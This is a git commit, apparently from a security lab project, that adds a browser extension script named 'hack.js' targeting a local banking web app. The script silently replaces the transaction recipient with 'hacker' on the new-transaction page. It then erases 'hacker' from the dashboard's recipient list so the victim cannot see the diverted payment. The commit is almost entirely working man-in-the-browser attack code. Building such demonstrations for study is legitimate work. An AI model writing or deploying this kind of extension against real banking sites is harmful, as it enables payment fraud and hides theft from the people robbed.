66d0124967b7dfd1a99812259d5aeff3419ffb79
Paweł Wilkosz <pwilkosz5@gmail.com>
2019-11-11 23:48:04 +0100

    browser extension for hacking

---
+++ bank/hackaddon/hack.js
@@ -0,0 +1,14 @@
+let victimName = "";
+if (window.location == "http://localhost:8000/new_transaction" && document.querySelector("a.btn")) {
+  const input = document.querySelector(".container > form:nth-child(4) > input:nth-child(2)")
+  victimName = input.value
+  input.value = "hacker"
+
+} else if (window.location == "http://localhost:8000/dashboard") {
+  const recipients = document.querySelectorAll(".table > tbody:nth-child(2) > tr > td:nth-child(2)")
+  for (field of recipients) {
+    if (field.innerText == "hacker") {
+      field.innerText = ""
+    }
+  }
+}
